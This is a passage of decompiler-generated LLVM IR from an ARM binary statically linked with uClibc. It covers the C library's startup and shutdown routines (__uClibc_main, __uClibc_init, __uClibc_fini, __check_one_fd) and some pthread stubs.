  call void @__pseudo_branch(i32 %v4_15ac4)
  %v0_15ad0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15ad0

dec_label_pc_15ad0:                               ; preds = %entry, %bb, %dec_label_pc_15a68, %dec_label_pc_15abc
  %v0_15ad0 = phi i32 [ %v1_15a60, %dec_label_pc_15a68 ], [ %v0_15ad0.pre, %dec_label_pc_15abc ], [ %v3_15a14, %entry ], [ %v1_15a60, %bb ]
  %v2_15ad4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_15ad4, i32* @r4, align 4
  ret i32 %v0_15ad0

; uselistorder directives
  uselistorder i32 %v0_15ab0, { 1, 0 }
  uselistorder i32 %v1_15a94.pre, { 0, 2, 1 }
  uselistorder i32 %v1_15a20, { 1, 2, 0 }
  uselistorder i32 %v1_15a5c, { 1, 0 }
  uselistorder i32 %v1_15a60, { 0, 1, 4, 3, 5, 6, 7, 2 }
  uselistorder i32 %v1_15a3c.pre, { 1, 0 }
  uselistorder i32 %v0_15a3450, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 4, 3, 5 }
  uselistorder i1* %cpsr_c.global-to-local, { 3, 5, 4, 0, 6, 10, 7, 9, 8, 1, 2 }
  uselistorder i32 116, { 0, 1, 2, 5, 3, 4 }
  uselistorder i32 -1036, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15ad0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_15ab4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15a9c, { 1, 0 }
  uselistorder label %dec_label_pc_15a5c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15a44, { 1, 0 }
  uselistorder label %dec_label_pc_15a2c, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutex_init() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @_pthread_cleanup_push_defer(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  %v3_15af4 = add i32 %tmp, 4
  %v4_15af4 = inttoptr i32 %v3_15af4 to i32*
  store i32 %arg3, i32* %v4_15af4, align 4
  ret i32 %tmp
}

define i32 @_pthread_cleanup_pop_restore(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v2_15b00 = icmp eq i32 %arg2, 0
  br i1 %v2_15b00, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v2_15b0c = add i32 %tmp, 4
  %v3_15b0c = inttoptr i32 %v2_15b0c to i32*
  %v4_15b0c = load i32, i32* %v3_15b0c, align 4
  store i32 %v4_15b0c, i32* %r0.global-to-local, align 4
  %v3_15b10 = load i32, i32* %arg1, align 4
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %.02 = phi i32 [ %v3_15b10, %bb ], [ undef, %entry ]
  %v2_15b18 = xor i1 %v2_15b00, true
  call void @__pseudo_cond_branch(i1 %v2_15b18, i32 %.02)
  %v1_15b24 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_15b24

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
dec_label_pc_15b4c.lr.ph:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_15b28 = load i32, i32* @r4, align 4
  store i32 %v3_15b28, i32* %stack_var_-16, align 4
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* %r5.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 -8), i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15b4c

dec_label_pc_15b4c:                               ; preds = %dec_label_pc_15b4c.dec_label_pc_15b4c_crit_edge, %dec_label_pc_15b4c.lr.ph
  %v1_15b4c = phi i32 [ %v1_15b58, %dec_label_pc_15b4c.dec_label_pc_15b4c_crit_edge ], [ 0, %dec_label_pc_15b4c.lr.ph ]
  %v0_15b4c = phi i32 [ %v0_15b4c.pre, %dec_label_pc_15b4c.dec_label_pc_15b4c_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 -8), %dec_label_pc_15b4c.lr.ph ]
  %v4_15b4c = mul i32 %v1_15b4c, 4
  %v5_15b4c = add i32 %v4_15b4c, %v0_15b4c
  %v6_15b4c = inttoptr i32 %v5_15b4c to i32*
  %v7_15b4c = load i32, i32* %v6_15b4c, align 4
  call void @__pseudo_branch(i32 %v7_15b4c)
  %v0_15b58 = load i32, i32* %r4.global-to-local, align 4
  %v1_15b58 = add i32 %v0_15b58, -1
  store i32 %v1_15b58, i32* %r4.global-to-local, align 4
  %v2_15b58 = icmp eq i32 %v0_15b58, 0
  br i1 %v2_15b58, label %dec_label_pc_15b60, label %dec_label_pc_15b4c.dec_label_pc_15b4c_crit_edge

dec_label_pc_15b4c.dec_label_pc_15b4c_crit_edge:  ; preds = %dec_label_pc_15b4c
  %v0_15b4c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15b4c

dec_label_pc_15b60:                               ; preds = %dec_label_pc_15b4c
  %v0_15b64.pre = load i32, i32* %r5.global-to-local, align 4
  %v2_15b64 = add i32 %v0_15b64.pre, 2000
  %v3_15b64 = inttoptr i32 %v2_15b64 to i32*
  %v4_15b64 = load i32, i32* %v3_15b64, align 4
  %v2_15b68 = icmp eq i32 %v4_15b64, 0
  br i1 %v2_15b68, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_15b60
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_15b60, %bb
  %v2_15b70 = xor i1 %v2_15b68, true
  call void @__pseudo_cond_branch(i1 %v2_15b70, i32 %v4_15b64)
  %v0_15b78 = load i32, i32* %r5.global-to-local, align 4
  %v2_15b78 = add i32 %v0_15b78, 2004
  %v3_15b78 = inttoptr i32 %v2_15b78 to i32*
  %v4_15b78 = load i32, i32* %v3_15b78, align 4
  %v2_15b7c = icmp eq i32 %v4_15b78, 0
  br i1 %v2_15b7c, label %bb19, label %bb18

bb18:                                             ; preds = %bb17
  br label %bb19

bb19:                                             ; preds = %bb17, %bb18
  %v2_15b84 = xor i1 %v2_15b7c, true
  call void @__pseudo_cond_branch(i1 %v2_15b84, i32 %v4_15b78)
  %v2_15b88 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15b88, i32* %r4.global-to-local, align 4
  %v1_15b8c = load i32, i32* @r0, align 4
  ret i32 %v1_15b8c

; uselistorder directives
  uselistorder i32 %v1_15b58, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_15ba4 = load i32, i32* @r4, align 4
  %v6_15ba4 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_15bb8 = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v3_15bc0 = icmp eq i32 %v2_15bb8, -1
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* @r3, align 4
  br i1 %v3_15bc0, label %dec_label_pc_15bcc, label %dec_label_pc_15be4

dec_label_pc_15bcc:                               ; preds = %entry
  %v0_15bd0 = load i32, i32* @r5, align 4
  %v2_15bd8 = call i32 @__libc_open(i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 -34196), i32 %v0_15bd0)
  %v1_15bdc = load i32, i32* @r4, align 4
  %v1_15be0 = icmp ne i32 %v2_15bd8, %v1_15bdc
  call void @__pseudo_cond_branch(i1 %v1_15be0, i32 ptrtoint (i32* @global_var_14500.563 to i32))
  br label %dec_label_pc_15be4

dec_label_pc_15be4:                               ; preds = %entry, %dec_label_pc_15bcc
  %v1_15bec = phi i32 [ %v2_15bb8, %entry ], [ %v2_15bd8, %dec_label_pc_15bcc ]
  store i32 %v3_15ba4, i32* @r4, align 4
  store i32 %v6_15ba4, i32* @r5, align 4
  ret i32 %v1_15bec

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_15be4, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15bf8 = load i32, i32* @r4, align 4
  store i32 %v3_15bf8, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* %r4.global-to-local, align 4
  %v4_15c08 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 148) to i32*), align 4
  %v1_15c0c = inttoptr i32 %v4_15c08 to i32*
  %v2_15c0c = load i32, i32* %v1_15c0c, align 4
  %v2_15c10 = icmp eq i32 %v2_15c0c, 0
  br i1 %v2_15c10, label %dec_label_pc_15c18, label %dec_label_pc_15c3c

dec_label_pc_15c18:                               ; preds = %entry
  store i32 4096, i32* %v1_15c0c, align 4
  %v0_15c20 = call i32 @__pthread_initialize_minimal()
  %v0_15c28 = load i32, i32* %r4.global-to-local, align 4
  %v2_15c28 = add i32 %v0_15c28, -48204
  %v2_15c30 = icmp eq i32 %v2_15c28, 0
  br i1 %v2_15c30, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_15c18
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_15c18, %bb
  %v2_15c38 = xor i1 %v2_15c30, true
  call void @__pseudo_cond_branch(i1 %v2_15c38, i32 %v2_15c28)
  %v2_15c3c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_15c3c

dec_label_pc_15c3c:                               ; preds = %entry, %bb4
  %v2_15c3c = phi i32 [ %v2_15c3c.pre, %bb4 ], [ %v3_15bf8, %entry ]
  %.0 = phi i32 [ %v0_15c20, %bb4 ], [ undef, %entry ]
  store i32 %v2_15c3c, i32* %r4.global-to-local, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 undef, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15c3c, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp62 = call i32 @__decompiler_undefined_function_0()
  %tmp63 = call i32 @__decompiler_undefined_function_0()
  %tmp64 = call i32 @__decompiler_undefined_function_0()
  %tmp65 = call i32 @__decompiler_undefined_function_0()
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-400 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-416 = alloca i32, align 4
  store i32 54176, i32* %r4.global-to-local, align 4
  %v1_15c5c = add i32 %tmp, 4
  store i32 %v1_15c5c, i32* %ip.global-to-local, align 4
  %v2_15c60 = load i32, i32* %arg3, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* %r4.global-to-local, align 4
  %v3_15c6c = mul i32 %arg2, 4
  store i32 %v3_15c6c, i32* @r7, align 4
  %v4_15c74 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 24) to i32*), align 4
  store i32 %v4_15c74, i32* %r1.global-to-local, align 4
  store i32 56, i32* %r2.global-to-local, align 4
  %v2_15c7c = add i32 %v1_15c5c, %v3_15c6c
  store i32 %v2_15c7c, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* %stack_var_-416, align 4
  %v4_15c84 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 56) to i32*), align 4
  store i32 %v4_15c84, i32* %r4.global-to-local, align 4
  %v3_15c88 = icmp uge i32 %v2_15c7c, %v2_15c60
  store i1 %v3_15c88, i1* %cpsr_c.global-to-local, align 1
  %v9_15c88 = icmp eq i32 %v2_15c7c, %v2_15c60
  store i1 %v9_15c88, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg7, i32* %r2.global-to-local, align 4
  %v2_15c90 = inttoptr i32 %v4_15c84 to i32*
  store i32 %v2_15c7c, i32* %v2_15c90, align 4
  br i1 %v9_15c88, label %bb, label %bb75

bb:                                               ; preds = %entry
  store i32 %tmp, i32* %ip.global-to-local, align 4
  br label %bb75

bb75:                                             ; preds = %entry, %bb
  %v0_15c98 = load i32, i32* %r2.global-to-local, align 4
  %v1_15c98 = load i32, i32* %r1.global-to-local, align 4
  %v2_15c98 = inttoptr i32 %v1_15c98 to i32*
  store i32 %v0_15c98, i32* %v2_15c98, align 4
  %v2_15c9c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_15c9c, i32* %r5.global-to-local, align 4
  store i32 %arg6, i32* %r1.global-to-local, align 4
  store i32 2004, i32* %r2.global-to-local, align 4
  %v0_15ca8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_15ca8, i32* @r6, align 4
  br i1 %v9_15c88, label %bb76, label %.thread52

.thread52:                                        ; preds = %bb75
  %v3_15cb053 = add i32 %v2_15c9c, 2004
  %v4_15cb054 = inttoptr i32 %v3_15cb053 to i32*
  store i32 %arg6, i32* %v4_15cb054, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %bb77

bb76:                                             ; preds = %bb75
  %v1_15cac = load i32, i32* %ip.global-to-local, align 4
  %v2_15cac = load i32, i32* @r7, align 4
  %v3_15cac = add i32 %v2_15cac, %v1_15cac
  store i32 %v3_15cac, i32* %r3.global-to-local, align 4
  %v3_15cb050 = add i32 %v2_15c9c, 2004
  %v4_15cb051 = inttoptr i32 %v3_15cb050 to i32*
  store i32 %arg6, i32* %v4_15cb051, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_15cbc = load i32, i32* %r3.global-to-local, align 4
  %v2_15cbc = load i32, i32* %r4.global-to-local, align 4
  %v3_15cbc = inttoptr i32 %v2_15cbc to i32*
  store i32 %v1_15cbc, i32* %v3_15cbc, align 4
  br label %bb77

bb77:                                             ; preds = %.thread52, %bb76
  %v2_15cc0 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_15cc0, i32* %r0.global-to-local, align 4
  store i32 120, i32* %r2.global-to-local, align 4
  %v3_15cc8 = bitcast i32* %stack_var_-120 to i8*
  %v4_15cc8 = call i32 @__GI_memset(i8* %v3_15cc8, i32 0, i32 120)
  store i32 %v4_15cc8, i32* %r0.global-to-local, align 4
  %v0_15ccc = load i32, i32* %r4.global-to-local, align 4
  %v1_15ccc = inttoptr i32 %v0_15ccc to i32*
  %v2_15ccc = load i32, i32* %v1_15ccc, align 4
  br label %dec_label_pc_15cd8

dec_label_pc_15cd8:                               ; preds = %dec_label_pc_15cd8, %bb77
  %storemerge = phi i32 [ %v2_15ccc, %bb77 ], [ %v1_15ce4, %dec_label_pc_15cd8 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_15cd8 = inttoptr i32 %storemerge to i32*
  %v2_15cd8 = load i32, i32* %v1_15cd8, align 4
  store i32 %v2_15cd8, i32* %r3.global-to-local, align 4
  %v2_15cdc = icmp eq i32 %v2_15cd8, 0
  %v1_15ce4 = add i32 %storemerge, 4
  br i1 %v2_15cdc, label %dec_label_pc_15ce4, label %dec_label_pc_15cd8

dec_label_pc_15ce4:                               ; preds = %dec_label_pc_15cd8
  store i32 %v1_15ce4, i32* @r4, align 4
  store i32 %v2_15cc0, i32* @r5, align 4
  %v1_15d0830 = inttoptr i32 %v1_15ce4 to i32*
  %v2_15d0831 = load i32, i32* %v1_15d0830, align 4
  store i32 %v2_15d0831, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15d0c33 = icmp eq i32 %v2_15d0831, 0
  store i1 %v2_15d0c33, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15d0c33, label %dec_label_pc_15d14, label %dec_label_pc_15cf0

dec_label_pc_15cf0:                               ; preds = %dec_label_pc_15ce4, %dec_label_pc_15d08
  %v4_15cf8 = phi i32 [ %v1_15d04, %dec_label_pc_15d08 ], [ %v1_15ce4, %dec_label_pc_15ce4 ]
  %v5_15cf4 = phi i32 [ %v2_15d08, %dec_label_pc_15d08 ], [ %v2_15d0831, %dec_label_pc_15ce4 ]
  %v2_15cf0 = icmp ugt i32 %v5_15cf4, 13
  store i1 %v2_15cf0, i1* %cpsr_c.global-to-local, align 1
  %v7_15cf0 = icmp eq i32 %v5_15cf4, 14
  store i1 %v7_15cf0, i1* %cpsr_z.global-to-local, align 1
  %v2_15cf4 = xor i1 %v2_15cf0, true
  %v3_15cf4 = or i1 %v7_15cf0, %v2_15cf4
  br i1 %v3_15cf4, label %bb78, label %bb79

bb78:                                             ; preds = %dec_label_pc_15cf0
  %v4_15cf4 = load i32, i32* @r5, align 4
  %v6_15cf4 = and i32 %v5_15cf4, 536870912
  %v7_15cf4 = icmp ne i32 %v6_15cf4, 0
  store i1 %v7_15cf4, i1* %cpsr_c.global-to-local, align 1
  %v8_15cf4 = mul i32 %v5_15cf4, 8
  %v9_15cf4 = add i32 %v4_15cf4, %v8_15cf4
  store i32 %v9_15cf4, i32* %r0.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_15cf0, %bb78
  %v1_15d00 = phi i1 [ %v2_15cf0, %dec_label_pc_15cf0 ], [ %v7_15cf4, %bb78 ]
  %v2_15cf8 = xor i1 %v1_15d00, true
  %v3_15cf8 = or i1 %v7_15cf0, %v2_15cf8
  br i1 %v3_15cf8, label %bb80, label %dec_label_pc_15d08

bb80:                                             ; preds = %bb79
  store i32 %v4_15cf8, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15d08

dec_label_pc_15d08:                               ; preds = %bb79, %bb80
  call void @__pseudo_cond_branch(i1 %v3_15cf8, i32 ptrtoint (i32* @global_var_12970.571 to i32))
  %v0_15d04 = load i32, i32* @r4, align 4
  %v1_15d04 = add i32 %v0_15d04, 8
  store i32 %v1_15d04, i32* @r4, align 4
  %v1_15d08 = inttoptr i32 %v1_15d04 to i32*
  %v2_15d08 = load i32, i32* %v1_15d08, align 4
  store i32 %v2_15d08, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15d0c = icmp eq i32 %v2_15d08, 0
  store i1 %v2_15d0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15d0c, label %dec_label_pc_15d14, label %dec_label_pc_15cf0

dec_label_pc_15d14:                               ; preds = %dec_label_pc_15d08, %dec_label_pc_15ce4
  store i32 %v2_15cc0, i32* %r0.global-to-local, align 4
  %v1_15d18 = call i32 @_dl_aux_init(i32 %v2_15cc0)
  store i32 %v1_15d18, i32* %r0.global-to-local, align 4
  %v1_15d1c = call i32 @__GI___uClibc_init(i32 %v1_15d18)
  store i32 %v1_15d1c, i32* @r0, align 4
  store i32 148, i32* %r3.global-to-local, align 4
  %v2_15d24 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_15d24, i32* @lr, align 4
  store i32 %tmp66, i32* @r2, align 4
  %v2_15d2c = add i32 %v2_15d24, 148
  %v3_15d2c = inttoptr i32 %v2_15d2c to i32*
  %v4_15d2c = load i32, i32* %v3_15d2c, align 4
  store i32 %v4_15d2c, i32* %r1.global-to-local, align 4
  store i32 %tmp65, i32* @r3, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15d34 = icmp eq i32 %tmp66, 0
  store i1 %v2_15d34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15d34, label %bb81, label %bb82

bb81:                                             ; preds = %dec_label_pc_15d14
  store i32 4096, i32* @r2, align 4
  br label %bb82

bb82:                                             ; preds = %dec_label_pc_15d14, %bb81
  %v0_15d40 = phi i32 [ %tmp66, %dec_label_pc_15d14 ], [ 4096, %bb81 ]
  %v3_15d3c = icmp eq i32 %tmp65, -1
  store i1 %v3_15d3c, i1* %cpsr_c.global-to-local, align 1
  %v8_15d3c = icmp eq i32 %tmp65, -1
  store i1 %v8_15d3c, i1* %cpsr_z.global-to-local, align 1
  %v2_15d40 = inttoptr i32 %v4_15d2c to i32*
  store i32 %v0_15d40, i32* %v2_15d40, align 4
  br i1 %v3_15d3c, label %dec_label_pc_15d48, label %dec_label_pc_15d70

dec_label_pc_15d48:                               ; preds = %bb82
  %v0_15d48 = call i32 @getuid()
  store i32 %v0_15d48, i32* @r0, align 4
  store i32 %v0_15d48, i32* %r4.global-to-local, align 4
  %v0_15d50 = call i32 @geteuid()
  store i32 %v0_15d50, i32* @r0, align 4
  %v3_15d54 = icmp uge i32 %v0_15d48, %v0_15d50
  store i1 %v3_15d54, i1* %cpsr_c.global-to-local, align 1
  %v9_15d54 = icmp eq i32 %v0_15d48, %v0_15d50
  store i1 %v9_15d54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15d54, label %dec_label_pc_15d5c, label %dec_label_pc_15d98

dec_label_pc_15d5c:                               ; preds = %dec_label_pc_15d48
  %v1_15d5c = call i32 @getgid(i32 %v0_15d50)
  store i32 %v1_15d5c, i32* @r0, align 4
  store i32 %v1_15d5c, i32* %r4.global-to-local, align 4
  %v0_15d64 = call i32 @getegid()
  store i32 %v0_15d64, i32* %r0.global-to-local, align 4
  %v3_15d68 = icmp uge i32 %v1_15d5c, %v0_15d64
  store i1 %v3_15d68, i1* %cpsr_c.global-to-local, align 1
  %v9_15d68 = icmp eq i32 %v1_15d5c, %v0_15d64
  store i1 %v9_15d68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15d68, label %dec_label_pc_15d70, label %dec_label_pc_15d98

dec_label_pc_15d70:                               ; preds = %dec_label_pc_15d5c, %bb82
  store i32 %tmp65, i32* @r2, align 4
  store i1 %v3_15d3c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v8_15d3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_15d3c, label %dec_label_pc_15dc0, label %dec_label_pc_15d7c

dec_label_pc_15d7c:                               ; preds = %dec_label_pc_15d70
  store i32 %tmp64, i32* @r3, align 4
  %v3_15d80 = icmp uge i32 %tmp65, %tmp64
  store i1 %v3_15d80, i1* %cpsr_c.global-to-local, align 1
  %v9_15d80 = icmp eq i32 %tmp65, %tmp64
  store i1 %v9_15d80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15d80, label %dec_label_pc_15d88, label %dec_label_pc_15d98

dec_label_pc_15d88:                               ; preds = %dec_label_pc_15d7c
  store i32 %tmp63, i32* @r2, align 4
  store i32 %tmp62, i32* @r3, align 4
  %v3_15d90 = icmp uge i32 %tmp63, %tmp62
  store i1 %v3_15d90, i1* %cpsr_c.global-to-local, align 1
  %v9_15d90 = icmp eq i32 %tmp63, %tmp62
  store i1 %v9_15d90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15d90, label %dec_label_pc_15dc0, label %dec_label_pc_15d98

dec_label_pc_15d98:                               ; preds = %dec_label_pc_15d7c, %dec_label_pc_15d5c, %dec_label_pc_15d48, %dec_label_pc_15d88
  store i32 32770, i32* @r4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 32768, i32* %r1.global-to-local, align 4
  %v2_15da4 = call i32 @__check_one_fd(i32 0, i32 32768)
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_15dac = load i32, i32* @r4, align 4
  store i32 %v0_15dac, i32* %r1.global-to-local, align 4
  %v2_15db0 = call i32 @__check_one_fd(i32 1, i32 %v0_15dac)
  %v0_15db4 = load i32, i32* @r4, align 4
  store i32 %v0_15db4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_15dbc = call i32 @__check_one_fd(i32 2, i32 %v0_15db4)
  store i32 %v2_15dbc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15dc0

dec_label_pc_15dc0:                               ; preds = %dec_label_pc_15d88, %dec_label_pc_15d70, %dec_label_pc_15d98
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 256, i32* %r3.global-to-local, align 4
  %v2_15dc8 = load i32, i32* %arg3, align 4
  store i32 %v2_15dc8, i32* %r2.global-to-local, align 4
  %v2_15dcc = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_15dcc, i32* %r1.global-to-local, align 4
  %v3_15dd0 = add i32 %v2_15dcc, 256
  %v4_15dd0 = inttoptr i32 %v3_15dd0 to i32*
  store i32 %v2_15dc8, i32* %v4_15dd0, align 4
  %v0_15dd4 = load i32, i32* %r0.global-to-local, align 4
  %v1_15dd4 = inttoptr i32 %v0_15dd4 to i32*
  %v2_15dd4 = load i32, i32* %v1_15dd4, align 4
  store i32 %v2_15dd4, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15dd8 = icmp eq i32 %v2_15dd4, 0
  store i1 %v2_15dd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15dd8, label %bb84, label %dec_label_pc_15de0

dec_label_pc_15de0:                               ; preds = %dec_label_pc_15dc0
  store i32 164, i32* %r3.global-to-local, align 4
  %v0_15de4 = load i32, i32* %r1.global-to-local, align 4
  %v2_15de4 = add i32 %v0_15de4, 164
  %v3_15de4 = inttoptr i32 %v2_15de4 to i32*
  %v4_15de4 = load i32, i32* %v3_15de4, align 4
  store i32 %v4_15de4, i32* %r3.global-to-local, align 4
  %v2_15de8 = inttoptr i32 %v4_15de4 to i32*
  store i32 %v2_15dd4, i32* %v2_15de8, align 4
  store i32 47, i32* %r1.global-to-local, align 4
  %v0_15df0 = load i32, i32* %r0.global-to-local, align 4
  %v1_15df0 = inttoptr i32 %v0_15df0 to i32*
  %v2_15df0 = load i32, i32* %v1_15df0, align 4
  store i32 %v2_15df0, i32* %r0.global-to-local, align 4
  %v4_15df4 = call i32 @__GI_strrchr(i32 %v2_15df0, i32 47, i32 %v2_15dc8, i32 %v4_15de4)
  store i32 %v4_15df4, i32* %r0.global-to-local, align 4
  store i32 96, i32* %r3.global-to-local, align 4
  %v2_15dfc = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_15dfc, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15e00 = icmp eq i32 %v4_15df4, 0
  store i1 %v2_15e00, i1* %cpsr_z.global-to-local, align 1
  %v2_15e04 = add i32 %v2_15dfc, 96
  %v3_15e04 = inttoptr i32 %v2_15e04 to i32*
  %v4_15e04 = load i32, i32* %v3_15e04, align 4
  store i32 %v4_15e04, i32* %r2.global-to-local, align 4
  br i1 %v2_15e00, label %.thread57, label %bb83

.thread57:                                        ; preds = %dec_label_pc_15de0
  %v2_15e0c58 = inttoptr i32 %v4_15e04 to i32*
  store i32 0, i32* %v2_15e0c58, align 4
  br label %bb84

bb83:                                             ; preds = %dec_label_pc_15de0
  %v2_15e08 = add i32 %v4_15df4, 1
  store i32 %v2_15e08, i32* %r3.global-to-local, align 4
  %v2_15e0c = inttoptr i32 %v4_15e04 to i32*
  store i32 %v4_15df4, i32* %v2_15e0c, align 4
  %v1_15e10 = load i32, i32* %r3.global-to-local, align 4
  %v2_15e10 = load i32, i32* %r2.global-to-local, align 4
  %v3_15e10 = inttoptr i32 %v2_15e10 to i32*
  store i32 %v1_15e10, i32* %v3_15e10, align 4
  br label %bb84

bb84:                                             ; preds = %.thread57, %bb83, %dec_label_pc_15dc0
  %v2_15e20 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_15e20, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_15e2c = add i32 %v2_15e20, -12
  store i32 %v2_15e2c, i32* %r5.global-to-local, align 4
  store i32 2000, i32* %r3.global-to-local, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_15e3c = add i32 %v2_15e20, 2000
  %v4_15e3c = inttoptr i32 %v3_15e3c to i32*
  store i32 %arg5, i32* %v4_15e3c, align 4
  %v0_15e5418 = load i32, i32* %r4.global-to-local, align 4
  %v1_15e5419 = load i32, i32* %r7.global-to-local, align 4
  %v3_15e5421 = icmp uge i32 %v0_15e5418, %v1_15e5419
